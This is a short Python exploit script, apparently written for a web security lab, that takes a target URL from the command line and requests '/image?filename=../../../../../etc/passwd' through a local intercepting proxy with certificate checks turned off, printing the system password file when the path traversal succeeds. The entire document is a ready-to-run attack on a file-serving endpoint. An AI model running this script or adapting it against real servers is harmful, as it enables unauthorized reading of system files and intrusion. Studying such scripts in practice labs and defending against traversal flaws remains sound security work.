import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def directory_traversal(session, url) :
    img_url = url + '/image?filename=../../../../../etc/passwd'
    res = session.get(img_url, verify=False, proxies=proxies)
    if 'root:x' in res.text :
        print("(+) The directory traversal exploit has success!")
        print(res.text)
    else :
        print("(-) The directory traversal has failed!")

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    session = requests.Session()
        
    directory_traversal(session, url)